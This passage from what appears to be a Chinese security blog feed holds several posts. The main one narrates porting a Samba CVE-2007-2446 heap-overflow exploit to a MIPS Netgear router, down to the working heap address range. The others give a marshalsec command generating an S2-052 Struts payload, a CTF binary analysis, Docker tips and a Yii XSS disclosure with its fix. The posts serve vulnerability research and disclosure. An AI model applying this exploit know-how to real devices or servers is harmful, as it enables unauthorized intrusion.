</code></pre><p>通过对这个错误信息进行调查分析，得知可能是使用了非标准的squashfs进行的压缩。我下载了最新版的SquashFS工具，重新进行编译。但是还是解压失败。更进一步的分析发现Firmware Mod Kit这个工具可能可以解压这个固件，虽然FMK这个工具好久不更新了。最后使用FMK的unsquashfs_all脚本，成功解压了固件。程序识别出，固件使用的squashfs版本为”./src/squashfs-3.0/mksquashfs-lzma”。</p>
<p>解压之后发现是一个基于OpenWRT的linux系统。老的Netgear路由器通过发送一个特定的包可以打开telent，具体的<a href="https://wiki.openwrt.org/toh/netgear/telnet.console" target="_blank" rel="external">技术分析参考</a>。连上telnet之后可以获得OpenWRT的版本为Kamikaze。</p>
<pre><code>BusyBox v1.4.2 (2013-12-23 15:48:24 CST) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

 _______                     ________        __ 
|<span class="string">       </span>|<span class="string">.-----.-----.-----.</span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">.----.</span>|<span class="string">  </span>|<span class="string">_ 
</span>|<span class="string">   -   </span>||<span class="string">  _  </span>|<span class="string">  -__</span>|<span class="string">     </span>||<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>||<span class="string">   _</span>||<span class="string">   _</span>|<span class="string"> 
</span>|<span class="string">_______</span>||<span class="string">   __</span>|<span class="string">_____</span>|<span class="string">__</span>|<span class="string">__</span>||<span class="string">________</span>||<span class="string">__</span>|<span class="string">  </span>|<span class="string">____</span>|
         |<span class="string">__</span>|<span class="string"> W I R E L E S S   F R E E D O M
KAMIKAZE (7.09)
-----------------------------------
 - 10 oz Vodka       Shake well with ice and strain
 - 10 oz Triple sec  mixture into 10 shot glasses.
 - 10 oz lime juice  Salute!
---------------------------------------------------
root@WNR2200:/#</span>
</code></pre><p>其他的版本信息<br><img src="/images/netgearsamba1.png" alt=""></p>
<p>很幸运，samba和linux kernel的版本都很低，更容易找到相对应的漏洞利用。</p>
<h2 id="虚拟机运行samba进程">虚拟机运行samba进程</h2><p>现在我们有了整个解压之后的虚拟机固件，第一步是想在qemu虚拟机中运行起来，当然我们选择只是虚拟运行samba进程。</p>
<p>首先需要安装qemu-static相关的程序。然后把“qemu-mips-static”复制到固件的根目录，之后使用chroot切换到固件的根目录执行。命令如下：</p>
<pre><code>“sudo chroot . ./qemu-mips-<span class="keyword">static</span> -g <span class="number">5656</span> ./usr/sbin/smbd -i -d <span class="number">10</span> &gt; fileout.txt”
</code></pre><p>具体解释一下这个命令：</p>
<p>1，chroot到固件的目录下，这样samba就可以认为固件目录是文件根目录。可以加载相关的lib库文件。</p>
<p>2，使用qemu虚拟运行samba。g参数是开启gdb调试，监听在5656端口。</p>
<p>3，d参数是设置调试模式为最高10。这样可以输出更多的调试信息。</p>
<p>4，重定向输出信息到文件里，方便后期查看。</p>
<p>运行这个文件的时候，会遇到一些问题。提示samba找不到smb.conf文件。在正常运行的路由器里查看，在/tmp目录有一些配置文件，但是在解压出来的固件里这个目录是空白的。可见这些文件是系统启动的时候，动态创建的。所以我们需要手动创建这些缺失的文件。</p>
<p>主要涉及到以下文件：</p>
<p>/etc/init.d/samba  这个文件会动态创建所需要的目录，复制配置到/tmp目录。然后执行下面的2个程序。</p>
<p>/usr/sbin/update_user 一个bash脚本。在/tmp/passwd文件中写入用户信息。</p>
<p>/usr/sbin/update_smb 一个二进制文件。更新tmp目录下的smb.conf配置信息。</p>
<p>bash脚本中的命令，可以手动一条条的执行。二进制文件使用 qemu-mips-static 模拟执行。最后检查/etc/目录中的相关软链接是否正确指向到了正确的文件。这时最开始的命令就可以正确执行了。</p>
<h2 id="寻找漏洞">寻找漏洞</h2><p>对应的samba版本的源代码可以在这里<a href="https://download.samba.org/pub/samba/stable/" target="_blank" rel="external">下载</a> 。通过查找对应版本存在的CVE发现一个典型的堆溢出漏洞。这个数据中有一个数值用来分配缓冲区，然后程序利用第二个数值来解组数据，写进缓冲区。如果第一个数值小于第二个数值就会导致堆溢出漏洞。</p>
<p>这个漏洞的编号是CVE-2007-2446。samba使用一个自定义的堆分配器talloc。talloc使用树形结构分配内存。在树形结构的任何一个节点都可以释放这个和他的子节点。为了实现这个特性，talloc实现了一个自定义的释放程序，他的指针保存在堆的元数据上，可以通过溢出覆盖。当一个chunk被释放的时候，通过覆盖堆的元数据可以实现任意代码执行。</p>
<p>已经有个x86的<a href="https://www.exploit-db.com/exploits/16875/" target="_blank" rel="external">metasploit利用模块</a>。这会对我们想在MIPS目标上实现漏洞利用有比较大的帮助。</p>
<h2 id="动态调试">动态调试</h2><p>现在我们已经已经可以用qemu虚拟机运行samba程序。使用IDA加载samba二进制文件，然后使用debugger模块可以进行远程调试。</p>
<p>一开始调试我们就遇到了一个问题。IDA直接展示了进程的整个内存空间的扁平视图，但是IDA并没有正确识别出我们的二进制文件中的起始位置。这导致在内存视图中所有的符号都没有关联到正确的位置，甚至IDA都无法识别哪些区域是数据哪些区域是代码。在这样的环境中调试是比较困难的，因为我们无法再感兴趣的函数上断点，也无法知道当前运行的是哪个函数。下图展示了IDA加载了进程之后的内存布局<br><img src="/images/netgearsamba2.png" alt=""></p>
<p>我一开始推测IDA停在的这个初始的点是在smbd的二进制程序中。但是通过比较smbd的main函数和二进制文件的入口点发现都不是。在这个断点处选取一些指令进行搜索，在smbd中却没有找到对应的结果。这让我觉得这段代码可能并不在smbd中。</p>
<p>为了定位这个函数，我向后寻找到最近的一个页边界。获得了一些有用的信息。</p>
<p>模块页边界 地址0x76436000<br><img src="/images/netgearsamba3.png" alt=""></p>
<p>从上图可以看到ELF这个魔术值。通过分析头上的指令可以知道这是ld-uClibc.so.0中的代码。通过readelf分析smbd可以确定ld-uClibc.so.0是smbd的动态加载器。</p>
<p>分析uClibc的代码发现这里可能是uClibc/ldso/ldso/mips/dl-startup.h相关的函数。函数中的最后一个跳转指令是跳到真正的二进制文件的入口点。单步调试跟踪到该跳转指令然后进入跳转，会让我们来到如下的代码处。<br><img src="/images/netgearsamba4.png" alt=""></p>
<p>0x76CB76C0 处的代码看起来很像是二进制程序的入口点。__uClibc_main的调用指令也印证了这一点。</p>
<p>我在IDA的反汇编里查找了一下__uClibc_main的交叉引用，结果有好几个。其中一个是上图中的函数。这个函数在二进制文件中的偏移是0x0003B6C0。使用内存中的地址0x76CB76C0减去二进制文件中的地址，得到在内存中的基址是0x76C7C000。然后使用IDA的rabase功能，填入正确的基址。这样调试的时候就可以看到正确的符号和函数名。</p>
<p><img src="/images/netgearsamba5.png" alt=""></p>
<h2 id="修改x86的利用程序">修改x86的利用程序</h2><p>首先需要修改的是获得一个针对mips的nop sled。因为内存布局不是百分百可以预测的，所有利用程序使用了nop sled技术来提高利用的成功率。所谓nop sled就是一堆什么都不做的处理器指令。它不会改变程序的状态。所以我们把一大段这种指令放在内存中，从这段指令的任何一个位置开始执行，都可以正常执行到我们真正的payload指令。这样可以提高成功率。</p>
<p>在MIPS汇编语言中，最基本的nop指令就是0x00000000，对应的汇编语言为“sll $0, 0”。一共大概有接近170个MIPS指令可以作为没有副作用的NOP指令。</p>
<p>如下图所示：</p>
<p><img src="/images/netgearsamba6.png" alt=""></p>
<h2 id="调试exploit">调试exploit</h2><p>本来也没有预期一次可以成功，第一次运行的时候在talloc_chunk_from_ptr函数中抛出了异常。<br><img src="/images/netgearsamba7.png" alt=""></p>
<p>talloc_chunk_from_ptr函数的作用是传入内存地址，给出相应的chunk的header和metadata。此外它还会验证元数据中的魔术数字是否是有效的和当前内存是否已经释放。异常出现在图中标识的代码上方，当从$a0寄存器的某个偏移处加载数据时异常。在MIPS架构中，$a0寄存器用来传递函数的第一个参数。查看一下寄存器的值可以看到，$a0的值是0x41414141。漏洞利用程序覆盖了一个chunk 的header。导致一些header中一些重要的值(魔术字和一些重要的指针)。</p>
<p><img src="/images/netgearsamba8.png" alt=""></p>
<p>所以初步假设元数据中的几个指针(前一个chunk,后一个chunk，父节点和子节点)被覆盖成了不正确的值。检查exploit的代码发现只有next和prev两个指针被设置成了0x41414141。为了进一步确认我们的猜想，可以看一下crash时候的调用栈。</p>
<p><img src="/images/netgearsamba9.png" alt=""></p>
<p>在crash之前，talloc_total_size被调用。分析一下这个函数的代码可以证实我们的猜测。</p>
<p><img src="/images/netgearsamba10.png" alt=""></p>
<p>上图展示了talloc_total_size函数的源码。用来计算内存分配树某个特定分支的大小。这个函数是递归的，并在每次迭代时会调用talloc_chunk_from_prt函数(发生崩溃的函数)，参数是链表的指针。图中高亮的代码“c=c-&gt;next”就是那个错误的值进入了talloc_total_size函数，最终进入talloc_chunk_from_prt的根源。</p>
<p>修复这个崩溃相对来说也比较简单。只要我们将覆盖头文件的next和prev指针的值修改为0x00000000,talloc_total_size中的循环将会提前终止，我们的指针就不会进入到后面的处理函数。</p>
<p>修改这个点之后，exploit就成功运行了。程序计数器成功被我们的标记值覆盖。</p>
<h2 id="重定向执行流程">重定向执行流程</h2><p>现有的exploit通过发送一个特定的SMB请求，在内存中创建一个巨大的nop sled。当这个缓冲区被解组的时候，会分配另一个缓冲区并写入数据溢出。溢出的talloc头部有一个函数指针被覆盖指向了原始缓冲区(nop sled位置)。由于堆内存的布局并不是百分百确定的，所以可以尝试暴力猜测，根据堆内存可能的位置每次每次使用不一样的控制指针。如果尝试失败，进程实例会被结束。因为samba是为每个进入的连接创建一个进程来处理，所以一个实例被杀掉是可以接受的。</p>
<p>除了暴力尝试猜测堆地址，我们尝试找到一个更可控的方式来控制执行流程。MIPS比x86架构有更多的寄存器，所以当获得执行权限的时候，其中更可能存在一些可预测的和有利用价值的值。可能存在实现ROP利用的机会，而ROP的利用会更加稳定。经过分析，尽管部分寄存器指向堆上可控的数据，但是却是不可利用的。他们指向的是talloc头部被溢出覆盖的区域。因为talloc头部在被写入和执行之间会被修改，所以尝试在这个区域写入shellcode是没法成功的。尝试找一个带偏移的寄存器来绕过这段不稳定的区域但是没有成功，没有找到合适的gadget。</p>
<p>既然没有找到更稳定的ROP利用，只好回到暴力堆地址的方法上来。在路由器上分析smbd的进程内存布局发现所有的实例的内存布局都是相同的，即使系统重新启动。这表明内核没有开启ASLR，内存布局都是可以预测的。有意思的是通过查看/proc/sys/kernel/randomize_va_space 文件的值为1。这表明内核认为ASLR已经开启了。</p>
<p>想要找到合适的地址需要先知道堆的边界，通过查看“/proc//maps” 就可以。查看路由器的这个文件显示如图。<br><img src="/images/netgearsamba11.png" alt=""></p>
<p>根据上图中的值，0x558be000到0x55965000可以作为暴力猜测的边界。</p>
<p>悲伤的是，利用这个边界暴力猜测失败了，metasploit并没有返回session。在qemu模拟系统上进一步调试发现，只要堆的范围正确，exploit是可以成功利用的。虽然不是很清楚为啥失败了，但是通过增加暴力猜测的范围为0x558b0000 -  0x559c0000 ，程序利用成功了。<br><img src="/images/netgearsamba12.png" alt=""></p>
<p>最终在在0x559b4000地址处，exploit成功利用。这个地址是稳定的，而且系统重启也不会发生变化。奇怪的是这个地址是在系统显示的堆的边界以外的。我还没有发现这个问题的根本原因，不过我猜测堆内存在运行过程中范围增加了，但是系统并没有恰当的跟踪好变化后的地址范围。</p>
<h2 id="备注">备注</h2><p>1，解压固件使用最新版的binwalk已经可以直接解压。docker版binwalk工具：<a href="https://github.com/stayliv3/embedded-device-lab/tree/master/docker-binwalk" target="_blank" rel="external">download</a><br>2，metasploit已经更新了针对mips samba的exploit。可以直接成功利用。<br>3，<a href="https://www.contextis.com/blog/porting-exploits-netgear-wnr2200" target="_blank" rel="external">原文地址：</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件漏洞和对应的利用程序现在已经非常常见了。幸运的是近几年对于漏洞的响应速度和补丁的更新时间也有了显著提高。但是在嵌入式设备的领域，由于固件升级需要用户下载一个新的固件包，然后升级设备才能解决存在的问题，所以嵌入式设备通常都是使用了比较老的操作系统和软件，没有及时更新到安全
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
      <category term="万物互联" scheme="http://xdxd.love/tags/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title>使用vscode远程调试docker容器内的php应用</title>
    <link href="http://xdxd.love/2017/09/13/%E4%BD%BF%E7%94%A8vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E5%AE%B9%E5%99%A8%E5%86%85%E7%9A%84php%E5%BA%94%E7%94%A8/"/>
    <id>http://xdxd.love/2017/09/13/使用vscode远程调试docker容器内的php应用/</id>
    <published>2017-09-13T07:14:38.000Z</published>
    <updated>2017-09-13T07:43:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>经常使用docker搭建各种环境进行漏洞测试。如何调试docker内的代码的也成为了一个新需求。使用xdebug插件，可以方便的调试docker内的php应用。</p>
<h2 id="docker环境安装xdebug">docker环境安装xdebug</h2><p>已经整合成docker-compose环境。可以直接clone <a href="https://github.com/stayliv3/docker-xdebug" target="_blank" rel="external">github.com/stayliv3/docker-xdebug</a>。</p>
<p>修改xdebug.ini文件内的xdebug.remote_host=172.16.1.203  ip为vscode的机器IP(docker宿主机ip)。</p>
<h2 id="vscode_配置">vscode 配置</h2><p>vscode安装PHP Debug Adapter for Visual Studio Code。</p>
<p>配置文件为：</p>
<pre><code><span class="collection">{
    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,
    <span class="string">"configurations"</span>: <span class="collection">[

        <span class="collection">{
            <span class="string">"name"</span>: <span class="string">"Listen for XDebug"</span>,
            <span class="string">"type"</span>: <span class="string">"php"</span>,
            <span class="string">"request"</span>: <span class="string">"launch"</span>,
            <span class="string">"port"</span>: <span class="number">9000</span>,
            // <span class="string">"stopOnEntry"</span>: <span class="number">1</span>, 运行开始断点，用于调试。
            <span class="string">"serverSourceRoot"</span>: <span class="string">"/var/www/html/"</span>,
            <span class="string">"localSourceRoot"</span>: <span class="string">"/Users/xxxxx/security/coding/xdebug-docker/app"</span>
        }</span>,
        <span class="collection">{
            <span class="string">"name"</span>: <span class="string">"Launch currently open script"</span>,
            <span class="string">"type"</span>: <span class="string">"php"</span>,
            <span class="string">"request"</span>: <span class="string">"launch"</span>,
            <span class="string">"program"</span>: <span class="string">"${file}"</span>,
            <span class="string">"cwd"</span>: <span class="string">"${fileDirname}"</span>,
            <span class="string">"port"</span>: <span class="number">9000</span>
        }</span>
    ]</span>
}</span>
</code></pre><p>主要是配置serverSourceRoot和localSourceRoot两个路径。localSourceRoot为vscode看到的php文件路径。然后就可以设置断点，使用vscode进行调试了。</p>
<p><img src="/images/dockerdebug1.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;经常使用docker搭建各种环境进行漏洞测试。如何调试docker内的代码的也成为了一个新需求。使用xdebug插件，可以方便的调试docker内的php应用。&lt;/p&gt;
&lt;h2 id=&quot;docker环境安装xdebug&quot;&gt;docker环境安装xdebug&lt;/h2&gt;&lt;p&gt;已经
    
    </summary>
    
      <category term="cve and others" scheme="http://xdxd.love/categories/cve-and-others/"/>
    
    
  </entry>
  
  <entry>
    <title>S2-052简单测试</title>
    <link href="http://xdxd.love/2017/09/07/S2-052%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95/"/>
    <id>http://xdxd.love/2017/09/07/S2-052简单测试/</id>
    <published>2017-09-07T01:54:50.000Z</published>
    <updated>2017-09-07T02:51:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞公告">漏洞公告</h2><p><img src="/images/s20521.png" alt=""></p>
<h2 id="测试环境">测试环境</h2><p>网上公开比较早的是CSDN的这个博客。<a href="https://github.com/jas502n/St2-052" target="_blank" rel="external">不过很快删掉了</a>。由于有快照，网上也出现了很多转载。</p>
<p>测试环境使用vulhub。直接使用048的测试环境，替换成新的app就可以。docker-compose.yml如下：</p>
<pre><code><span class="attribute">version</span>: <span class="string">'2'</span>
<span class="attribute">services</span>:
 <span class="attribute">struts2</span>:
   <span class="attribute">image</span>: vulhub/<span class="attribute">struts2</span>:<span class="number">2.3</span>.<span class="number">32</span>-showcase
   <span class="attribute">volumes</span>:
    - ./ROOT.<span class="attribute">war</span>:/usr/local/tomcat/webapps/ROOT.war
   <span class="attribute">ports</span>:
    - <span class="string">"8080:8080"</span>
</code></pre><p>测试用的<a href="http://archive.apache.org/dist/struts/2.3.32/struts-2.3.32-apps.zip" target="_blank" rel="external">app用的2.3.32版本</a></p>
<h2 id="marshalsec">marshalsec</h2><pre><code>java -cp target/marshalsec-<span class="number">0.0</span>.<span class="number">1</span>-SNAPSHOT-all<span class="class">.jar</span> marshalsec<span class="class">.XStream</span>  ImageIO  touch /tmp/ls
</code></pre><p>使用marshalsec生成测试poc</p>
<p>官方也不是很靠谱，一开始说是影响2.5-2.5.12。结果用2.3.32测试同样存在漏洞。后来官方又修改了公告。影响范围为2.1.2-2.3.33，2.5-2.5.12</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">S2-052漏洞分析及官方缓解措施无效验证</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞公告&quot;&gt;漏洞公告&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/s20521.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;测试环境&quot;&gt;测试环境&lt;/h2&gt;&lt;p&gt;网上公开比较早的是CSDN的这个博客。&lt;a href=&quot;https://github.com
    
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>一个简单mips可执行文件分析</title>
    <link href="http://xdxd.love/2017/09/06/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95mips%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2017/09/06/一个简单mips可执行文件分析/</id>
    <published>2017-09-06T08:31:04.000Z</published>
    <updated>2017-09-06T08:58:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://bbs.pediy.com/thread-219062.htm" target="_blank" rel="external">[分享]蝶澈的CTF题</a></p>
<p>之前分析蝶澈的CTF题过程中，学到了一些新东西。一直想记录一下，算是交流和来往。可是等到忘的快差不多了也还是没写。</p>
<h2 id="简单分析">简单分析</h2><p>看到文件名感觉像是一个正常的设备固件，搜索一下发现是一个真是的路由器的固件，还曾出过漏洞。<br><img src="/images/kanxue1.png" alt=""><br>下载了原版固件，使用binwalk解包之后，对所有的文件进行了对比。<br>我采用的方式是针对每个文件hash，然后比较。</p>
<pre><code>find . -type f |xargs md5 &gt; test.txt
diff <span class="number">1.</span>txt <span class="number">2.</span>txt
</code></pre><p><img src="/images/kanxue2.png" alt=""></p>
<p>可以看到文件大概有3处修改，增加了nc文件，passwd和services文件。以及help目录删掉了一些文件。</p>
<p>看蝶澈的writeup中使用了<a href="https://github.com/bmaia/binwally这个工具做两个目录的文件比较。" target="_blank" rel="external">https://github.com/bmaia/binwally这个工具做两个目录的文件比较。</a></p>
<h2 id="静态分析：">静态分析：</h2><p>看一下字符串，可以看到不少有价值的字符串。不过看不到中文的字符串。<br><img src="/images/kanxue3.png" alt=""></p>
<p>直接cat可以看到中文：<br><img src="/images/kanxue4.png" alt=""></p>
<h2 id="动态调试">动态调试</h2><p>路由器的环境搭建可以参考<a href="http://bbs.pediy.com/thread-212369.htm" target="_blank" rel="external">看雪</a>。通常来说搭建一个mips的调试环境还是需要花费不少时间，踩一些坑的。为了方便分析。我做了一个基于docker的一键测试环境<a href="https://github.com/stayliv3/embedded-device-lab" target="_blank" rel="external">embedded-device-lab</a>可以直接使用gdb或者ida动态调试。</p>
<p>经过简单的尝试，发现应该是需要输入一个密码。如果密码正确，可以获得flag。<br><img src="/images/kanxue5.png" alt=""></p>
<p>通过getflag。socket等关键字，可以定位到关键函数400310。通过一番调试发现，</p>
<p>这里：</p>
<pre><code>loc_40071<span class="number">0</span>:
lw      <span class="variable">$v1</span>, <span class="number">0x850</span>+var_83<span class="number">0</span>(<span class="variable">$fp</span>)
li      <span class="variable">$v0</span>, <span class="number">1</span>
beq     <span class="variable">$v1</span>, <span class="variable">$v0</span>, loc_40038C
nop
</code></pre><p>需要v1不等v0才能进入有getflag相关的逻辑。而当我们随便输入密码的时候，v1都是等于v0=1的。所以，在这里把v0修改成其他的值，就可以继续运行到getflag相关的逻辑。<br><img src="/images/kanxue7.png" alt=""></p>
<p>其实我也分析过了一下加密的函数，只是没看懂。<br><img src="/images/kanxue6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-219062.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;[分享]蝶澈的CTF题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前分析蝶澈的CTF题
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>openstack虚拟机上docker容器无法上网解决方案</title>
    <link href="http://xdxd.love/2017/09/04/openstack%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Adocker%E5%AE%B9%E5%99%A8%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://xdxd.love/2017/09/04/openstack虚拟机上docker容器无法上网解决方案/</id>
    <published>2017-09-04T06:30:52.000Z</published>
    <updated>2017-09-04T07:11:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题">问题</h2><p>虚拟机上安装docker之后，docker容器内无法访问外网。DNS解析和部分http可以通信。</p>
<p>虚拟机版本为：ubuntu 14.04<br>docker版本为：17.07.0-ce<br>虚拟环境为：openstack</p>
<h2 id="GOOGLE">GOOGLE</h2><p>搜索发现可能是由于openstack默认mtu是1450，而docker默认mtu是1500导致的。ifconfig查看，果然如此。eth0 mtu是1450.而docker0 mtu是1500.</p>
<h2 id="探索">探索</h2><p>尝试修改docker0的mtu。发现了两个方案：</p>
<p>1，编辑/etc/docker/daemon.json文件。ubuntu上默认没有这个文件。可以新建，内容如下。</p>
<pre><code>{
  "<span class="attribute">mtu</span>": <span class="value"><span class="number">1500</span>
</span>}
</code></pre><p>2，编辑/etc/default/docker文件。ubuntu上有这个文件。默认内容为空。</p>
<pre><code>DOCKER_OPTS=“--mtu=<span class="number">1450</span><span class="string">"</span>
</code></pre><p>测试发现这两个方法修改之后。docker0显示的mtu依然是1500。此时陷入迷茫。</p>
<p>通过docker network inspect bridge 命令发现bridge网络的属性中mtu被设置成了1450.如下：</p>
<pre><code><span class="string">"Options"</span>: {

    <span class="string">"com.docker.network.bridge.default_bridge"</span>: <span class="string">"true"</span>,

    <span class="string">"com.docker.network.bridge.enable_icc"</span>: <span class="string">"true"</span>,

    <span class="string">"com.docker.network.bridge.enable_ip_masquerade"</span>: <span class="string">"true"</span>,

    <span class="string">"com.docker.network.bridge.host_binding_ipv4"</span>: <span class="string">"0.0.0.0"</span>,

    <span class="string">"com.docker.network.bridge.name"</span>: <span class="string">"docker0"</span>,

    <span class="string">"com.docker.network.driver.mtu"</span>: <span class="string">"1450"</span>

},
</code></pre><p>而我测试的docker容器使用了docker compose。看了下<a href="https://docs.docker.com/compose/networking/#updating-containers" target="_blank" rel="external">docker compose的文档</a>。得知docker compose会自动创建一个新的网络。可以通过如下的方式配置网络的参数：</p>
<pre><code><span class="attribute">networks</span>:
  <span class="attribute">frontend</span>:
    # Use a custom driver
    <span class="attribute">driver</span>: custom-driver-<span class="number">1</span>
  <span class="attribute">backend</span>:
    # Use a custom driver which takes special options
    <span class="attribute">driver</span>: custom-driver-<span class="number">2</span>
    <span class="attribute">driver_opts</span>:
      <span class="attribute">foo</span>: <span class="string">"1"</span>
      <span class="attribute">bar</span>: <span class="string">"2"</span>
</code></pre><p>先在docker-compose.yml中配置如下：</p>
<pre><code>networks：
 <span class="keyword">default</span>:
  mtu: <span class="number">1450</span>
</code></pre><p>发现并没有效果。使用docker network inspect compose-default 查看，参数一栏写的是：</p>
<pre><code><span class="string">"mtu"</span>: <span class="string">"1450"</span>
</code></pre><p>注意到之前在bridge中，参数一栏是”com.docker.network.driver.mtu”，所以尝试修改docker-compose.yml文件中参数为：</p>
<pre><code>networks:
 default:
  com<span class="class">.docker</span><span class="class">.network</span><span class="class">.driver</span><span class="class">.mtu</span>: <span class="number">1450</span>
</code></pre><p>重启生效。</p>
<h2 id="解决方案">解决方案</h2><p>所以在docker-compose.yml文件中修改networks的参数mtu为1450即可。</p>
<p>疑问：</p>
<p>docker0显示的mtu并不会发生改变。看到一些文档里写的是修改docker0属性，可能是对于docker0的理解有误。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;问题&lt;/h2&gt;&lt;p&gt;虚拟机上安装docker之后，docker容器内无法访问外网。DNS解析和部分http可以通信。&lt;/p&gt;
&lt;p&gt;虚拟机版本为：ubuntu 14.04&lt;br&gt;docker版本为：17.07.0-ce&lt;br&gt;虚拟环境为：openstack
    
    </summary>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-11516 yii框架开发模式导致的通用性反射XSS</title>
    <link href="http://xdxd.love/2017/08/03/yii%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%9A%E7%94%A8%E6%80%A7%E5%8F%8D%E5%B0%84XSS/"/>
    <id>http://xdxd.love/2017/08/03/yii框架开发模式导致的通用性反射XSS/</id>
    <published>2017-08-03T08:42:28.000Z</published>
    <updated>2017-10-30T03:12:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/yiixss5.png" alt=""></p>
<h2 id="漏洞测试">漏洞测试</h2><p>测试版本：最新版2.0.10</p>
<p>当Yii框架开启了debug和dev模式的时候，报错页面存在通用性的反射XSS。Yii提供的demo中默认是开启了dev模式的。</p>
<pre><code><span class="comment">// comment out the following two lines when deployed to production</span>
defined(<span class="string">'YII_DEBUG'</span>) <span class="subst">or</span> <span class="class"><span class="keyword">define</span></span>(<span class="string">'YII_DEBUG'</span>, <span class="literal">true</span>);
defined(<span class="string">'YII_ENV'</span>) <span class="subst">or</span> <span class="class"><span class="keyword">define</span></span>(<span class="string">'YII_ENV'</span>, <span class="string">'dev'</span>);
</code></pre><p>虽然有提示说正式发布到线上需要关闭。但是由于众所周知的原因，总是会有人在线上开启了dev模式。</p>
<p><img src="/images/yiixss1.png" alt=""></p>
<p>如图所示，由于报错页面的输出的环境变量的信息，没有做转移，直接写入页面导致的反射XSS。</p>
<h2 id="代码分析">代码分析</h2><p>使用vscode和php debug插件进行代码调试。触发异常之后的调用过程如下。</p>
<p><img src="/images/yiixss2.png" alt=""></p>
<pre><code>/**
* Renders the global variables <span class="keyword">of</span> the request.
* List <span class="keyword">of</span> global variables is defined <span class="keyword">in</span> [[displayVars]].
* @<span class="keyword">return</span> string the rendering result
* @see displayVars
*/
public <span class="keyword">function</span> renderRequest()
{
    <span class="variable">$request</span> = <span class="string">''</span>;
    foreach (<span class="variable">$this-</span>&gt;displayVars as <span class="variable">$name</span>) {
        if (!empty(<span class="variable">$GLOBALS</span>[<span class="variable">$name</span>])) {
            <span class="variable">$request</span> .= <span class="string">'$'</span> . <span class="variable">$name</span> . <span class="string">' = '</span> . VarDumper::export(<span class="variable">$GLOBALS</span>[<span class="variable">$name</span>]) . <span class="string">";\n\n"</span>;
        }
    }

    return <span class="string">'&lt;pre&gt;'</span> . rtrim(<span class="variable">$request</span>, <span class="string">"\n"</span>) . <span class="string">'&lt;/pre&gt;'</span>;
}
</code></pre><p>请求中的参数会直接输出。导致了XSS。</p>
<h2 id="修复方式">修复方式</h2><p>Yii框架本身有各种安全的函数。这里可以采用</p>
<pre><code>use yii\helpers\Html;
    <span class="keyword">return</span> <span class="string">'&lt;pre&gt;'</span> . rtrim(**Html::encode(<span class="variable">$request</span>)**, <span class="string">"\n"</span>) . <span class="string">'&lt;/pre&gt;'</span>;
</code></pre><p>的方式解决XSS的问题。<br><img src="/images/yiixss3.png" alt=""></p>
<h2 id="总结思考">总结思考</h2><p>一个问题是debug模式下的安全问题是否是安全漏洞。可能的有的观点是框架都已经建议开发者在线上关闭debug模式了。我觉得评判的标准应该是这个问题是否可以利用，是否存在危害。<br>只有debug模式才存在只是大幅减少了漏洞的影响面，而不能否认漏洞本身。可以参考struts2开发模式存在的安全问题。比较巧的是struts2开发模式也出现过XSS的问题。<br><!-- ![](/images/yiixss4.png) --></p>
<h2 id="漏洞报告">漏洞报告</h2><p>20170116 邮件汇报给Yii官方<br>20170118 得到确认<br><img src="/images/yiixss4.png" alt=""><br>20170721 发布patch</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/yiixss5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
